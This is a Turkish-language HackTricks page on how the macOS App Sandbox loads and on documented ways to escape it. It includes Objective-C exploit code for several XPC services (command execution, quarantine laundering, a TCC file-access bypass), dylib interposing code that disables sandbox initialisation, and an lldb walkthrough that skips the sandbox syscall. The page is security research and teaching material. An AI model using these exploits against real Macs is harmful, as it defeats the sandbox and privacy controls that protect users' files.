# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Sandbox loading process

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Görsel: <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Önceki görselde, **`com.apple.security.app-sandbox`** entitlement'ına sahip bir application çalıştırıldığında **sandbox'ın nasıl yüklendiği** görülebilir.

Compiler, `/usr/lib/libSystem.B.dylib` dosyasını binary'ye linkler.

Ardından **`libSystem.B`**, **`xpc_pipe_routine`** application'ın entitlement'larını **`securityd`**'ye gönderene kadar çeşitli function'ları çağırır. Securityd, process'in sandbox içinde quarantine edilip edilmemesi gerektiğini kontrol eder ve gerekiyorsa quarantine eder.\
Son olarak sandbox, **`__sandbox_ms`** çağrısıyla etkinleştirilir; bu function **`__mac_syscall`**'u çağırır.<sup>[[1]](#references)[[3]](#references)</sup>

## Possible Bypasses

### Bypassing quarantine attribute

**Sandboxed process'ler tarafından oluşturulan file'lara**, sandbox escape'lerini önlemek için **quarantine attribute** eklenir: yeni bir application bırakıp çalıştırmayı denerseniz quarantine flag'i bunu engeller. Bu nedenle, **quarantine attribute olmadan bir file veya folder bırakabilirseniz, App Sandbox'tan escape edebilirsiniz** — yalnızca bir `.app` bundle'ı bırakıp `open` ile çalıştırın; çünkü yeni başlatılan process, sandbox'ınız altında değil, LaunchServices altında çalışır.

**Quarantine edilmemiş bir drop** elde etmenin güvenilir yolu, **başka bir process'ten file'ı sizin için oluşturmasını istemektir**. Mickey Jin tarafından yazılan [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) yazısında belgelendiği üzere, **App Sandbox** bırakılan file'ları quarantine ile işaretler, ancak **Service Sandbox** altında çalışan XPC service'leri bunu yapmaz. Bu nedenle, kimlik doğrulaması gerektirmeyen çeşitli XPC service'leri bir "quarantine laundering" primitive'i olarak kullanılabilir:<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) ve **CVE-2023-32414** (`ArchiveService`): sandboxed app tarafından gönderilen bir archive'ı, extracted içeriğe **quarantine xattr'ını propagate etmeden** seçilen bir konuma extract eder.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): `submitSignpostDataWithConfig:` içindeki path traversal, **quarantine olmadan arbitrary directory'ler oluşturulmasına** izin veriyordu; bu da container dışında eksiksiz bir `.app` bundle yapısı oluşturmak için yeterlidir.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): quarantined bir DMG'yi, **sonuçta oluşan device'ı quarantine etmeden** attach eder; böylece mounted volume üzerindeki application'lar çalıştırılabilir.

> [!TIP]
> Extraction genellikle **executable permission bit'ini kaldırır**. CVE-2023-27944'te kullanılan workaround, bundle'ın main executable'ı olarak mevcut ve imzalı bir system binary'sine (ör. `/System/Library/CoreServices/Automator Application Stub`) bir **symlink** yerleştirmekti; bu yöntem, bırakılan file üzerinde `+x` bulunmasına gerek kalmadan file'ın çalıştırılabilir kalmasını sağlar.

> [!CAUTION]
> Bunun çalışmasının nedeni, kontrolün çalıştırılan item üzerindeki **flag** tarafından gerçekleştirilmesidir: *"When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it"*, ancak bundan sonra *"it's handed over to Gatekeeper for full 'first run' security checks"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Çalıştırdığınız bundle üzerinde flag bulunmaması, Gatekeeper kontrolünün de yapılmaması anlamına gelir — CVE'lerin sağladığı primitive tam olarak budur.<sup>[[5]](#references)</sup>
>
> Bir `.app` bundle'ın çalıştırılması için daha önce authorize edildiğini (üzerinde "authorized to run" flag'i bulunan bir quarantine xattr olduğunu) varsayalım; bu durumda onu da abuse edebilirsiniz... ancak artık **`.app`** bundle'larının içine, bazı privileged TCC perms'lerine sahip olmadığınız sürece write edemezsiniz (sandbox içinde bu izinlere sahip olmayacaksınız).

### Abusing Open functionality

[**Word sandbox bypass'lerinin son örneklerinde**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv), **`open`** cli functionality'sinin sandbox'ı bypass etmek için nasıl abuse edilebileceği görülebilir.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Bir application'ın **sandboxed olması amaçlanmış olsa bile** (`com.apple.security.app-sandbox`), örneğin bir **LaunchAgent** (`~/Library/LaunchAgents`) tarafından **execute edilirse** sandbox'ı bypass etmek mümkündür.\
[**Bu post'ta**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818) açıklandığı gibi, sandboxed bir application ile persistence elde etmek istiyorsanız, onu otomatik olarak bir LaunchAgent olarak execute edebilir ve belki de DyLib environment variable'ları üzerinden malicious code inject edebilirsiniz.<sup>[[6]](#references)</sup>

### Abusing Auto Start Locations

Bir sandboxed process, **daha sonra unsandboxed bir application'ın binary'yi çalıştıracağı** bir konuma **write** edebiliyorsa, binary'yi oraya yerleştirerek **escape edebilir**. Bu tür konumlara iyi örnekler `~/Library/LaunchAgents` veya `/System/Library/LaunchDaemons`'dır.

Bunun için **2 adım** bile gerekebilir: **daha permissive bir sandbox'a** (`file-read*`, `file-write*`) sahip bir process'in, kodunuzu execute etmesini sağlamak; bu kod daha sonra **unsandboxed olarak execute edileceği** bir konuma write edecektir.

**Auto Start locations** hakkındaki bu sayfaya bakın:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Abusing other processes

Sandboxed process'ten, daha az restrictive sandbox'larda (veya hiç sandbox olmadan) çalışan **diğer process'leri compromise** edebiliyorsanız, onların sandbox'larına escape edebilirsiniz:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Available System and User Mach services

Sandbox ayrıca `application.sb` profile'ında tanımlanan XPC üzerinden belirli **Mach service'leri** ile iletişim kurulmasına izin verir. Bu service'lerden birini **abuse** edebilirseniz, **sandbox'tan escape** edebilirsiniz.

[Bu writeup'ta](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) belirtildiği üzere, Mach service'leri hakkındaki bilgiler `/System/Library/xpc/launchd.plist` içinde tutulur. Bu file içinde `<string>System</string>` ve `<string>User</string>` aratılarak tüm System ve User Mach service'leri bulunabilir.<sup>[[4]](#references)</sup>

Ayrıca, `bootstrap_look_up` çağrılarak bir Mach service'in sandboxed application için kullanılabilir olup olmadığı kontrol edilebilir:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### Kullanılabilir PID Mach services

Bu Mach services, [bu writeup'ta sandbox'tan kaçmak için](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) ilk kez kötüye kullanıldı. O zamana kadar, bir application ve framework'ü tarafından **gereken tüm XPC services**, application'ın PID domain'inde görünür durumdaydı (bunlar `ServiceType` değeri `Application` olan Mach Services'tır).<sup>[[4]](#references)</sup>

Bir **PID Domain XPC service'e bağlanmak** için, onu application içinde aşağıdakine benzer bir satırla kaydetmek yeterlidir:
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
Ayrıca, `System/Library/xpc/launchd.plist` içinde `<string>Application</string>` araması yaparak tüm **Application** Mach services öğelerini bulmak mümkündür.

Geçerli xpc services öğelerini bulmanın başka bir yolu da şunlardakileri kontrol etmektir:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
Bu tekniği kötüye kullanan birkaç örnek [**original writeup**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) içinde bulunabilir; ancak aşağıda bazı özetlenmiş örnekler yer almaktadır.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Bu servis, her zaman `YES` döndürerek tüm XPC bağlantılarına izin verir ve `runTask:arguments:withReply:` yöntemi, keyfi parametrelerle keyfi bir komut çalıştırır.

Exploit "şu kadar basitti":
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Bu XPC service, her zaman `YES` döndürerek tüm client'lara izin veriyordu ve `createZipAtPath:hourThreshold:withReply:` method'u bir klasörün path'ini kabul edip klasörü bir ZIP dosyasına sıkıştırıyordu.

Bu nedenle sahte bir app klasör yapısı oluşturmak, bunu sıkıştırmak, ardından decompress edip execute etmek mümkündü; çünkü yeni dosyalarda quarantine attribute bulunmayacaktı.

Exploit şu şekildeydi:
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Bu XPC service, herhangi bir bağlantıyı kabul eden `extendAccessToURL:completion:` yöntemi aracılığıyla XPC client'a rastgele bir URL için okuma ve yazma erişimi verilmesine olanak tanır. XPC service FDA'ya sahip olduğundan, bu izinler TCC'yi tamamen bypass etmek için kötüye kullanılabilir.

Exploit şu şekildeydi:
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Statik Derleme ve Dinamik Bağlama

[**Bu araştırma**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) Sandbox'ı bypass etmek için 2 yöntem keşfetti. Sandbox, **libSystem** library yüklendiğinde userland üzerinden uygulandığı için, bir binary bunu yüklemekten kaçınabilirse hiçbir zaman sandbox'lanmazdı:<sup>[[2]](#references)</sup>

- Binary **tamamen statik olarak derlenmişse**, bu library'yi yüklemekten kaçınabilirdi.
- **Binary'nin herhangi bir library yüklemesi gerekmiyorsa** (çünkü linker da libSystem içinde bulunur), libSystem'i yüklemesi gerekmez.

### Shellcodes

**Shellcode**'ların bile ARM64 üzerinde `libSystem.dylib` içine linklenmesi gerektiğini unutmayın:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Devralınmayan kısıtlamalar

**[Bu writeup'ın bonus bölümünde](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)** açıklandığı üzere, şu tür bir sandbox kısıtlaması:<sup>[[4]](#references)</sup>
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
örneğin şunu çalıştıran yeni bir process tarafından bypass edilebilir:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
Ancak elbette bu yeni süreç, üst süreçteki entitlements veya ayrıcalıkları devralmayacaktır.

### Entitlements

Bir uygulamanın belirli bir **entitlement** değerine sahip olması durumunda bazı **eylemlerin** **sandbox tarafından** izinli olabileceğini unutmayın; örneğin:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

**Interposting** hakkında daha fazla bilgi için:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Sandbox'ı önlemek için `_libsecinit_initializer` üzerine Interpost edin
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Sandbox'u önlemek için `__mac_syscall` Interpose etmek
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Sandbox'u lldb ile Debug etme ve bypass

Bir sandbox içinde çalışması gereken bir uygulama derleyelim:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Ardından uygulamayı derleyin:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> Uygulama **`~/Desktop/del.txt`** dosyasını **okumaya** çalışacak; ancak **Sandbox** buna izin vermeyecek.\
> Sandbox bypass edildikten sonra dosyayı okuyabileceğinden, orada bir dosya oluşturun:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Sandbox'ın ne zaman yüklendiğini görmek için uygulamanın debug işlemini gerçekleştirelim:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Sandbox aşılmış olsa bile TCC**, kullanıcıya işlemin masaüstündeki dosyaları okumasına izin vermek isteyip istemediğini soracaktır

## References

- [1] [Jonathan Levin - The Apple Sandbox: Quagmire'ın Derinliklerine (HITB GSEC 2016 slides)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Mac App Store Sandbox Kaçışı](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - The Apple Sandbox: Quagmire'ın Derinliklerine (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - macOS Sandbox Kaçışlarında Yeni Bir Dönem](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Açıklayıcı: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): Telegram ile DyLib Injection kullanarak macOS TCC Bypass (Part 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
{{#include ../../../../../banners/hacktricks-training.md}}
